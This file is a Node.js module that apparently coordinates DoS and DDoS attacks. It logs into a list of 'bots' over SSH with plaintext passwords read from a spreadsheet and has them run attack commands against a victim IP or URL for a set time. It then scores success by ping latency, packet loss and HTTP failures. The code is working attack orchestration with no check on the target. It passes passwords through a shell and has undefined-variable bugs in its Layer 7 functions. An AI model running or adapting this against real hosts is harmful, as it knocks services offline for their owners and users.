
const {spawn} = require('node:child_process');
const XLSX = require('xlsx');

const fs = require('fs');



const OUTPUT_DIR_INIT = "./output/";

//These 2 variables are used to determine if an attack is successfull
const LATENCY_GAP = 1.7 // avg ping attacking > GAP*avg ping init --> attack success\
const PACKET_LOSS_THRESHOLD = 10 // 10% 


//These 2 variables are used to determine if a target is down
const TARGET_DOWN_THRESHOLD = 1.3
const TARGET_DOWN_MAX_RETRY = 10;

const CUR_DIR = "tools/attack/";
const path = require('path');

const ATTACK_REPORT_FILEPATH = './output/'; // file ON SERVER.JS
const BOT_EXCEL_FILE_PATH = './bots.xlsx'; // Path to Bots.xlsx file ON SERVER.JS





async function readBotInfoFromExcel() {
    const workbook = XLSX.readFile(BOT_EXCEL_FILE_PATH);
    const sheetName = workbook.SheetNames[0]; // Get the first sheet name
    const worksheet = workbook.Sheets[sheetName];
    const botList = XLSX.utils.sheet_to_json(worksheet, {header: 1, skipHeader: true});
    botList.shift(); // Remove 1st column - header of the sheet
    return botList.map((row) => ({
        name: row[0],
        ip: row[1],
        username: row[2],
        password: row[3],
    }));
}


async function getAttackMethod(filePath) {
    const fullPath = path.join(CUR_DIR,filePath);
    return new Promise((resolve, reject) => {
        fs.readFile(fullPath, 'utf8', (err, data) => {
            if (err !== null) {
                reject(new Error(`Error reading file ${fullPath}: ${err.message}`));
                return;
            }
            try {
                const attackList = JSON.parse(data); // Parse the JSON data
                resolve(attackList);
            } catch (error) {
                reject(new Error('Invalid JSON format'));
            }
        });
    });
}


async function writeFile(id, toolName, toolType, toolLayer, toolAttackType, attackResult, attackType) {
    const filePath = `${ATTACK_REPORT_FILEPATH}${id}-${attackType}.json`;

    try {
        // Check if the file exists
        if (fs.existsSync(filePath)) {
            const fileData = await fs.promises.readFile(filePath, 'utf8');
            const jsonData = JSON.parse(fileData);
        } else {
            // Create a new file with an empty object
            const initialData = { result: [] };
            await fs.promises.writeFile(filePath, JSON.stringify(initialData, null, 2));
        }

        const fileData = await fs.promises.readFile(filePath, 'utf8');
        const jsonData = JSON.parse(fileData);

        const layerIndex = jsonData.result.findIndex(obj => obj.hasOwnProperty(toolLayer));

        if (layerIndex === -1) {
            const newLayerObj = {
                [toolLayer]: [{
                    [toolName]: {
                        [toolAttackType]: {
                            [toolType]: attackResult.result
                        }
                    }
                }]
            };
            jsonData.result.push(newLayerObj);
        } else {
            const layerObj = jsonData.result[layerIndex][toolLayer];
            const toolNameIndex = layerObj.findIndex(obj => obj.hasOwnProperty(toolName));

            if (toolNameIndex !== -1) {
                const toolNameObj = layerObj[toolNameIndex][toolName];

                if (toolNameObj.hasOwnProperty(toolAttackType)) {
                    toolNameObj[toolAttackType][toolType] = attackResult.result;
                } else {
                    toolNameObj[toolAttackType] = {
                        [toolType]: attackResult.result
                    };
                }
            } else {
                const newToolNameObj = {
                    [toolName]: {
                        [toolAttackType]: {
                            [toolType]: attackResult.result
                        }
                    }
                };
                layerObj.push(newToolNameObj);
            }
        }

        await fs.promises.writeFile(filePath, JSON.stringify(jsonData, null, 2));
    } catch (error) {
        console.error('Error reading or writing JSON file:', error);
    }
}


async function runCommand(exec) {
    return new Promise((resolve, reject) => {

        const process = spawn('/bin/bash', exec);


        console.log(`PID: ${process.pid}, Performing command : ${exec}`);

        let output = '';
        process.stdout.on('data', (data) => {
            output += data.toString();
        });

        process.on('close', (code, signal) => {
            if (code === 0) {
                resolve(output.trim());
            } else if (code === 6) {
                console.log(`PID: ${process.pid}, Performing: ${exec}`);
            } else if (code === null || code === 255 || code === 124) {
                console.log(`Ended pid: ${process.pid}`);
                resolve(null);
            } else {
                reject(new Error(`PID ${process.pid} exited with code ${code}, signal: ${signal}`));
            }
        });
    });
}

async function sshAndRunScript(bot, remoteScript,duration) {
    const timeOutCommand = `timeout ${duration}s`;
    const sshCommand = `sshpass -p ${bot.password} ssh ${bot.username}@${bot.ip} sudo "${timeOutCommand} ${remoteScript}"`;
    await runCommand(['-c', sshCommand]);
}

async function sshAndRunScriptNoAdmin(bot, remoteScript,duration) {
    const timeOutCommand = `timeout ${duration}s`;
    const sshCommand = `sshpass -p ${bot.password} ssh ${bot.username}@${bot.ip} "${timeOutCommand} ${remoteScript}"`;
    await runCommand(['-c', sshCommand]);
}





const getValidNumber = (value, fallback = 0) => {
    const number = Number(value);
    return isNaN(number) ? fallback : number;
  };

  async function checkTargetDownusingPing(victim, duration, initPing, threshold_gap = TARGET_DOWN_THRESHOLD) {
    let retryCount = 0;
    const delay = 200; // Wait 200ms after each ping

  
    while (retryCount < TARGET_DOWN_MAX_RETRY) {
      try {
        console.log('Initiating pingTest on target ...');
        const { min, avg, max, packetLossPercentage } = await pingTest(victim, duration);

        console.log('pingTest successful.');
  
        const minThreshold = initPing.min * threshold_gap;
        const avgThreshold = initPing.avg * threshold_gap;
        const maxThreshold = initPing.max * threshold_gap;
        const packetLossThreshold = initPing.packetLossPercentage * threshold_gap;
  
        console.log(`Thresholds: min=${minThreshold}, avg=${avgThreshold}, max=${maxThreshold}, packetLoss=${packetLossThreshold}`);
  
        if (
            //Just to be safe
            min !== null &&
            avg !== null &&
            max !== null &&
            packetLossPercentage !== null &&

            // min <= minThreshold &&
            avg <= avgThreshold &&
            // max <= maxThreshold &&
            packetLossPercentage <= packetLossThreshold
          ) {
            console.log('Target is not down.');
            return false; // Target is not down, break the loop
          } else {
            console.log('Ping values exceeded thresholds.');
          }
      } catch (error) {
        console.error('Error:', error);
      }
  
      console.log(`Retry count: ${retryCount + 1}/${TARGET_DOWN_MAX_RETRY}`);
      retryCount++;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  
    console.log('Target is down after maxRetries.');
    return true;
  }


async function checkTargetDownUsingGet(url, duration, initPing, threshold_gap = TARGET_DOWN_THRESHOLD) {
    let retryCount = 0;
    const delay = 200; // Wait 200ms after each ping

  
    while (retryCount < TARGET_DOWN_MAX_RETRY) {
      try {
        console.log('Initiating getTest on target ...');
        const { min, avg, max, packetLossPercentage } = await getGetTest(url, duration);

        console.log('pingTest successful.');
  
        const minThreshold = initPing.min * threshold_gap;
        const avgThreshold = initPing.avg * threshold_gap;
        const maxThreshold = initPing.max * threshold_gap;
        const packetLossThreshold = initPing.packetLossPercentage * threshold_gap;
  
        console.log(`Thresholds: min=${minThreshold}, avg=${avgThreshold}, max=${maxThreshold}, packetLoss=${packetLossThreshold}`);
  
        if (
            //Just to be safe
            min !== null &&
            avg !== null &&
            max !== null &&
            packetLossPercentage !== null &&
            
            // min <= minThreshold &&
            avg <= avgThreshold &&
            // max <= maxThreshold &&
            packetLossPercentage <= packetLossThreshold
          ) {
            console.log('Target is not down.');
            return false; // Target is not down, break the loop
          } else {
            console.log('Ping values exceeded thresholds.');
          }
      } catch (error) {
        console.error('Error:', error);
      }
  
      console.log(`Retry count: ${retryCount + 1}/${TARGET_DOWN_MAX_RETRY}`);
      retryCount++;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  
    console.log('Target is down after maxRetries.');
    return true;
}










const handleExitPingTest = (code, output) => {
    return new Promise((resolve, reject) => {
        if (code === 0) {
            if (output) {
                try {
                    const parsedOutput = parsePingOutput(output);
                    resolve(parsedOutput);
                } catch (error) {
                    reject(error);
                }
            } else {
                reject(new Error('Ping output is empty'));
            }
        } else if (code === 1) {
            console.error(`Victim is unreachable`);
            resolve(null);
        }
        
        else {
            console.error(`ping exited with code ${code}`);
            reject(new Error(`ping exited with code ${code}`));
        }
    });
};


function pingTest(victimIP, duration) {
    return new Promise((resolve, reject) => {
        const pingCommand = `ping -c ${duration} ${victimIP}`; // Pings ${ATTACK_DURATION} times
        const pingProcess = spawn('/bin/bash', ['-c', pingCommand]);
        let output = '';

        console.log(`Start ping test on ${victimIP}...`);

        pingProcess.stdout.on('data', (data) => {
            output += data.toString();
        });

        pingProcess.stderr.on('data', (data) => {
            console.error(`ping stderr: ${data}`);
        });

        pingProcess.on('exit', (code) => {
            handleExitPingTest(code, output)
                .then(resolve)
                .catch(reject);
        });

        // Set a timeout Promise that kills the pingProcess and rejects the pingTest Promise if it resolves before pingProcess exits
        const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => {
                pingProcess.kill('SIGINT'); // Send CTRL+C signal
                pingProcess.once('exit', () => {
                    reject(new Error('PingTimeout'));
                });
            }, (duration + 1) * 1000);
        });

        Promise.race([
            new Promise((resolve, reject) => pingProcess.once('exit', (code) => {
                handleExitPingTest(code, output)
                    .then(resolve)
                    .catch(reject);
            })),
            timeoutPromise
        ])
            .catch(reject);
    });
}



async function parsePingOutput(output) {

    const lines = output.split('\n');

    // Remove the empty line at the end
    lines.pop();

    // Get the summary line
    const summaryLine = lines.pop();

    if (!summaryLine) {
        // Handle the case where the summary line is missing
        return {
            min: null,
            avg: null,
            max: null,
            packetLossPercentage: null,
        };
    }
    // Parse the summary line
    const [start, name, equalSign, rttTime, ms] = summaryLine.split(/\s+/);
    const rttGet = rttTime.split("/");

    // Get the time line
    const timeLine = lines.pop();
    const [_, __, ___, ____, _____, packetLoss, ______] = timeLine.split(/\s+/);
    const rtt = {
        min: parseFloat(rttGet[0]) || null,
        avg: parseFloat(rttGet[1]) || null,
        max: parseFloat(rttGet[2]) || null,
    };

    //Get packet loss
    const packetLossPercentage = parseFloat(packetLoss.replace(/[%,]/g, ''));

    //return
    return {
        min: rtt.min,
        avg: rtt.avg,
        max: rtt.max,
        packetLossPercentage,
    };
}



//Like pingTest, but for Layer 7
const getGetTest = (url, durationInSeconds) => {
    const getHighResolutionTime = () => {
      const hr = process.hrtime();
      return hr[0] * 1e9 + hr[1];
    };
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  
    const logMessage = (message, isError = false) => {
      if (isError) {
        console.error(message);
      } else {
        console.log(message);
      }
    };
  
    return new Promise((resolve, reject) => {
      const latencies = [];
      let totalRequests = 0;
      let successfulRequests = 0;
      const endTime = Date.now() + durationInSeconds * 1000;
      const stopTime = endTime - 1500; // Stop 1.5 seconds before the end
  
      const fetchLoop = async () => {
        let lastFetchTime = Date.now();
        while (Date.now() < stopTime) {
          const now = Date.now();
          const timeSinceLastFetch = now - lastFetchTime;
          if (timeSinceLastFetch >= 2000) {
            totalRequests++;
            const startTime = getHighResolutionTime();
            try {
              await sleep(100);
              await Promise.race([
                fetch(url),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Fetch timeout')), 1000)),
              ]);
              const endTime = getHighResolutionTime();
              const latency = endTime - startTime;
              latencies.push(latency);
              successfulRequests++;
              lastFetchTime = now;
            } catch (error) {
              logMessage(`Attack is effective: ${error.message}`, true);
            }
          }
        }
  
        const max = latencies.length > 0 ? (Math.max(...latencies) / 1e9).toFixed(3) : 9999.000;
        const min = latencies.length > 0 ? (Math.min(...latencies) / 1e9).toFixed(3) : 9999.000;
        const avg = latencies.length > 0 ? (latencies.reduce((sum, latency) => sum + latency, 0) / latencies.length / 1e9).toFixed(3) : 9999.000;
        const packetLossPercentage = ((totalRequests - successfulRequests) / totalRequests) * 100;
        resolve({ max: parseFloat(max), avg: parseFloat(avg), min: parseFloat(min), packetLossPercentage: parseFloat(packetLossPercentage) });
      };
  
      fetchLoop().catch(reject);
    });
  };



  function roundToDecimalPlaces(number, decimalPlaces) {
    const factor = Math.pow(10, decimalPlaces);
    return Math.round(number * factor) / factor;
  }

  // Function to score an attack
function scoreAttack(scanData, type) {
    const { success, packetLossPercentage, avgPing, maxPing } = scanData;
    let score;
  
    switch (type) {
      case '2': // DOS
        if (!success) {
          if (packetLossPercentage >= 50) {
            score = 10;
          } else if (packetLossPercentage >= 25) {
            score = 8;
          } else {
            score = 6;
          }
        } else {
          if (avgPing <= 2.5 && maxPing <= 5) {
            score = 0;
          } else if (avgPing <= 5 && maxPing <= 10) {
            score = 2;
          } else {
            score = 4;
          }
        }
        break;
      case '3': // DDoS
        if (success) {
          if (packetLossPercentage >= 50) {
            score = 10;
          } else if (packetLossPercentage >= 25) {
            score = 8;
          } else {
            score = 6;
          }
        } else {
          if (avgPing <= 2.5 && maxPing <= 5) {
            score = 0;
          } else if (avgPing <= 5 && maxPing <= 10) {
            score = 2;
          } else {
            score = 4;
          }
        }
        break;
      default:
        console.error('Invalid attack type');
        score = null;
    }
  
    console.log(`Scoring attack: ${JSON.stringify(scanData)}, Type: ${type}, Score: ${score}`);
    return score;
  }




async function ddos(victimId,victimIP,toolName,toolType,toolLayer,toolAttackType,cmd,duration, threads,initPing) {
    console.log("---------------------------------------------------------------");
    console.log(`Start ${toolName} ${toolType} DDOS attack on ${victimIP}, in ${duration} seconds.`);
    console.log("---------------------------------------------------------------");

    const botList = await readBotInfoFromExcel();


    const pingPromise = pingTest(victimIP,duration)
        .then(pingResult => {
            const score = scoreAttack(pingResult, '3');
            const attackResult = {
                attack: `${toolName} - ${toolType}`,
                result: {
                    success: Boolean(
                        (pingResult.avg > LATENCY_GAP * initPing.avgPing) ||
                        (pingResult.packetLossPercentage >= PACKET_LOSS_THRESHOLD)
                    )
                    ,
                    avgPing: pingResult.avg || null,
                    maxPing: pingResult.max || null,
                    packetLossPercentage: pingResult.packetLossPercentage,
                    score: score
                },
            };

            writeFile(victimId,toolName,toolType,toolLayer,toolAttackType,attackResult,"ddos");
            return;
        })
        .catch(error => {
                if (error.message === 'PingTimeout') {
                    // console.log('Ping timed out, skipping the attack.');
                    throw error;
                    // return; // Return early if ping times out
                } else {
                    throw error; // Rethrow other errors
                }
        });


    const sshPromises = botList.map((bot) => sshAndRunScript(bot, cmd,duration));

    const [pingResult, ...otherResults] = await Promise.allSettled([pingPromise, ...sshPromises]);

    return;
}

async function dos(victimId,victimIP,toolName,toolType,toolLayer,toolAttackType,cmd,duration, threads,initPing) {
    console.log("---------------------------------------------------------------");
    console.log(`Start ${toolName} ${toolType} DoS attack on ${victimIP}, in ${duration} seconds.`);
    console.log("---------------------------------------------------------------");

    const botList = await readBotInfoFromExcel();

    const pingPromise = pingTest(victimIP,duration)
        .then(pingResult => {
            const score = scoreAttack(pingResult, '2');
            const attackResult = {
                attack: `${toolName} - ${toolType}`,
                result: {
                    success: Boolean(
                        (pingResult.avg > LATENCY_GAP * initPing.avgPing) ||
                        (pingResult.packetLossPercentage >= PACKET_LOSS_THRESHOLD)
                    ),
                    avgPing: pingResult.avg || null,
                    maxPing: pingResult.max || null,
                    packetLossPercentage: pingResult.packetLossPercentage,
                    score: score
                },
            };



            writeFile(victimId,toolName,toolType,toolLayer,toolAttackType,attackResult,"dos");
            return;
        })
        .catch(error => {
            if (error.message === 'PingTimeout') {
                // console.log('Ping timed out, skipping the attack.');
                throw error;
                // return; // Return early if ping times out
            } else {
                throw error; // Rethrow other errors
            }
        });

    //DDoS run all bots, DoS only run 1st of them
    const sshPromises = sshAndRunScript(botList[0], cmd,duration);

    const [pingResult, ...otherResults] = await Promise.allSettled([pingPromise, sshPromises]);

    return;
}

async function dosLayer7(victimId,victimUrl,toolName,toolType,toolLayer,toolAttackType,cmd,duration, threads,initPing) {
    console.log("---------------------------------------------------------------");
    console.log(`Start ${toolName} ${toolType} DoS attack on ${victimUrl}, in ${duration} seconds.`);
    console.log("---------------------------------------------------------------");



    const botList = await readBotInfoFromExcel();

    const pingPromise = getGetTest(victimUrl,duration)
        .then(getRes => {
            const score = scoreAttack(pingResult, '2');
            const attackResult = {
                attack: `${toolName} - ${toolType}`,
                result: {
                    success: Boolean(
                        (getRes.avg > LATENCY_GAP * initPing.avgPing) ||
                        (getRes.packetLossPercentage >= PACKET_LOSS_THRESHOLD)
                    ),
                    avgPing: getRes.avg || null,
                    maxPing: getRes.max || null,
                    packetLossPercentage: getRes.packetLossPercentage,
                    score: score
                },
            };



            writeFile(victimId,toolName,toolType,toolLayer,toolAttackType,attackResult,"dos");
            return;
        })
        .catch(error => {
            if (error.message === 'PingTimeout') {
                // console.log('Ping timed out, skipping the attack.');
                throw error;
                // return; // Return early if ping times out
            } else {
                throw error; // Rethrow other errors
            }
        });

    //DDoS run all bots, DoS only run 1st of them
    const sshPromises = sshAndRunScriptNoAdmin(botList[0],cmd,duration);

    const [getRes, ...otherResults] = await Promise.allSettled([pingPromise, sshPromises]);



    return;
}

async function ddosLayer7(victimId,victimUrl,toolName,toolType,toolLayer,toolAttackType,cmd,duration, threads,initPing) {
    console.log("---------------------------------------------------------------");
    console.log(`Start ${toolName} ${toolType} DDoS attack on ${victimUrl}, in ${duration} seconds.`);
    console.log("---------------------------------------------------------------");



    const botList = await readBotInfoFromExcel();

    const pingPromise = getGetTest(victimUrl,duration)
        .then(getRes => {
            const score = scoreAttack(pingResult, '3');
            const attackResult = {
                attack: `${toolName} - ${toolType}`,
                result: {
                    success: Boolean (
                        (getRes.avg > LATENCY_GAP * initPing.avgPing) ||
                        (getRes.packetLossPercentage >= PACKET_LOSS_THRESHOLD)
                    ),
                    avgPing: getRes.avg || null,
                    maxPing: getRes.max || null,
                    packetLossPercentage: getRes.packetLossPercentage,
                    score: score
                },
            };



            writeFile(victimId,toolName,toolType,toolLayer,toolAttackType,attackResult,"ddos");
            return;
        })
        .catch(error => {
            if (error.message === 'PingTimeout') {
                // console.log('Ping timed out, skipping the attack.');
                throw error;
                // return; // Return early if ping times out
            } else {
                throw error; // Rethrow other errors
            }
        });

    //DDoS run all bots, DoS only run 1st of them
    const sshPromises = botList.map((bot) => sshAndRunScriptNoAdmin(bot, cmd,duration));

    const [pingResult, ...otherResults] = await Promise.allSettled([pingPromise, sshPromises]);

    return;
}









async function writeInitPing(victimID, result) {
    const filePath = `${OUTPUT_DIR_INIT}${victimID}-init.json`;

    try {
        // Read the existing JSON data from the file
        // Read the existing JSON data from the file
        const jsonData = JSON.parse(await fs.promises.readFile(filePath, 'utf8'));

        // Update the initPing object with the provided ping results
        jsonData.initPing = {
            minPing: result.min || null,
            avgPing: result.avg || null,
            maxPing: result.max || null,
            packetLossPercentage: result.packetLossPercentage
        };

        // Write the updated JSON data back to the file
        await fs.promises.writeFile(filePath, JSON.stringify(jsonData, null, 2));
        console.log(`Ping results updated for victim ${victimID}`);
    } catch (error) {
        console.error(`Error updating JSON file for victim ${victimID}:`, error);
    }
}


async function initPing(victimId,victimIP,duration){
    console.log("---------------------------------------------------------------");
    console.log(`Start INIT Ping test on ${victimIP}, in ${duration} seconds.`);
    console.log("---------------------------------------------------------------");

    const pingPromise = pingTest(victimIP,duration)
        .then(pingResult => {
            const attackResult = {
                minPing: pingResult.min || null,
                avgPing: pingResult.avg || null,
                maxPing: pingResult.max || null,
                packetLossPercentage: pingResult.packetLossPercentage
            };

            return pingResult;
        })
        .catch(error => {
            if (error.message === 'PingTimeout') {
                // console.log('Ping timed out, skipping the attack.');
                throw error;
                // return; // Return early if ping times out
            } else {
                throw error; // Rethrow other errors
            }
        });
    const pingResult= await pingPromise;
    await writeInitPing(victimId, pingResult);
    return pingResult;
}


async function writeInitGet(victimID, result) {
    const filePath = `${OUTPUT_DIR_INIT}${victimID}-init.json`;

    try {
        // Read the existing JSON data from the file
        const jsonData = JSON.parse(await fs.promises.readFile(filePath, 'utf8'));

        // Update the initPing object with the provided ping results
        jsonData.initGet = {
            minPing: result.min || null,
            avgPing: result.avg || null,
            maxPing: result.max || null,
            packetLossPercentage: result.packetLossPercentage
        };

        // Write the updated JSON data back to the file
        await fs.promises.writeFile(filePath, JSON.stringify(jsonData, null, 2));
        console.log(`Get results updated for victim ${victimID}`);
    } catch (error) {
        console.error(`Error updating JSON file for victim ${victimID}:`, error);
    }
}


async function initGet(victimId,victimUrl,duration){
    console.log("---------------------------------------------------------------");
    console.log(`Start INIT GET test on ${victimUrl}, in ${duration} seconds.`);
    console.log("---------------------------------------------------------------");

    const getPromise = getGetTest(victimUrl,duration)
        .then(getRes => {
            const attackResult = {
                minPing: getRes.min || null,
                avgPing: getRes.avg || null,
                maxPing: getRes.max || null,
                packetLossPercentage: getRes.packetLossPercentage
            };

            return getRes;
        })
        .catch(error => {
            if (error.message === 'GetTimeout') {
                // console.log('Ping timed out, skipping the attack.');
                throw error;
                // return; // Return early if ping times out
            } else {
                throw error; // Rethrow other errors
            }
        });
    const getResult= await getPromise;
    await writeInitGet(victimId, getResult);
    return getResult;
}



module.exports = {
    writeFile,
    getAttackMethod,
    initPing,
    initGet,
    dos,ddos,
    dosLayer7,ddosLayer7,
    checkTargetDownUsingGet, checkTargetDownusingPing
}